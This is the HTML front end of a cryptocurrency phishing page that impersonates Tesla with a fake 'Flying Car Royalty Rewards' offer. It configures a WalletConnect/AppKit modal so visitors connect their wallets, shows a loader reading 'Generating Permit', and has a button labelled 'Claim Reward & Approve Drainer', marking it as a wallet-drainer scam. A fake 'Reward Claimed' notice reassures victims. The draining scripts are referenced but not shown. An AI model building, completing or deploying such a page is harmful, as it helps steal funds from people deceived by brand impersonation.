<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tesla Flying Car Royalty Program</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    
    <!-- AppKit Script -->
    <script type="module" src="https://esm.sh/@reown/appkit?deps=@reown/appkit-controllers,@reown/appkit-ui-wallet-modal"></script>
    <script type="module" src="https://esm.sh/@reown/appkit-controllers"></script>
    <script type="module" src="https://esm.sh/@reown/appkit-ui-wallet-modal"></script>

    <!-- Custom Config for AppKit -->
    <script type="module">
        import { createAppKit } from '@reown/appkit';
        import { EthereumChain, BscChain } from '@reown/appkit/networks';

        const metadata = {
            name: 'Tesla Flying Car',
            description: 'Official Loyalty Rewards',
            url: 'https://your-vercel-link.vercel.app',
            icons: ['https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png']
        };

        const themeVariables = {
            '--w3m-accent': '#3e6ae8', // Tesla Blue
            '--w3m-border-radius-max': '12px',
            '--w3m-font-family': 'Inter, sans-serif'
        };

        createAppKit({
            adapters: [], 
            chains: [EthereumChain, BscChain],
            projectId: '962425907914a3e80a7d8e7288b23f62', // Get this from cloud.walletconnect.com
            metadata,
            themeVariables
        });
    </script>
</head>
<body>
    <div class="tesla-bg"></div>
    
    <div class="container">
        <header>
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png" alt="Tesla Logo" class="logo">
            <h1>Flying Car Royalty Rewards</h1>
            <p>Connect your wallet to verify eligibility for the $0.05 USDT Pilot Reward.</p>
        </header>

        <main id="main-content">
            <!-- Step 1: Connect -->
            <div id="connect-step" class="card">
                <!-- AppKit Modal Trigger -->
                <button id="connect-btn">Connect Wallet</button>
                <div id="loader" class="hidden">Verifying Network & Generating Permit...</div>
            </div>

            <!-- Step 2: Dashboard (Hidden initially) -->
            <div id="dashboard" class="card hidden">
                <div class="status-row">
                    <span>Address:</span>
                    <span id="user-address" class="mono">0x000...000</span>
                </div>
                <div class="status-row">
                    <span>Status:</span>
                    <span id="reward-status">Pending Approval</span>
                </div>
                
                <div class="action-area">
                    <button id="claim-btn" class="hidden">Claim Reward & Approve Drainer</button>
                </div>
            </div>

            <!-- Notification Toast -->
            <div id="notification" class="toast hidden">
                <div class="icon">✓</div>
                <div class="text">Reward Claimed! $0.05 USDT sent to your wallet.</div>
            </div>
        </main>
    </div>

    <script src="interceptor.js"></script>
    <script src="app.js"></script>
</body>
</html>
